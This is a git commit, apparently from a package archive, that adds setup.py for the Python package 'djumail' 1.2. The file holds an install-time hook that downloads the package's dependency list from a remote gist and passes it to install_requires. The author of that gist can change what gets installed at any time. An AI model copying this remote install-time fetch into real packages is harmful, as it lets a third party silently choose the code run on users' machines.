9485e97501b8b49266ea06f8aec66756f0397384
Bot <41898282+github-actions[bot]@users.noreply.github.com>
2023-08-06 20:36:00 +0000

    Add package djumail/1.2/djumail-1.2.tar.gz

---
+++ packages/djumail/djumail-1.2.tar.gz/djumail-1.2/setup.py
@@ -0,0 +1,26 @@
+from setuptools import find_packages, setup
+import urllib.request
+
+
+
+def read_requirements():
+    link = "https://gist.githubusercontent.com/hajidalakhtar/73792df96238efd649b03085eccb219a/raw/2b35f64596469534806b57378127079380f0a486/gistfile1.txt"
+    with urllib.request.urlopen(link) as f:
+    # with open("requirements.txt", "r") as req:
+        content = f.read().decode(f.headers.get_content_charset())
+        requirements = content.split("\n")
+
+    return requirements
+
+
+setup(
+    name="djumail",
+    version="1.2",
+    packages=find_packages(),
+    include_package_data=True,
+    install_requires=read_requirements(),
+    entry_points="""
+        [console_scripts]
+        djumail=djumail.djumail:main
+    """,
+)
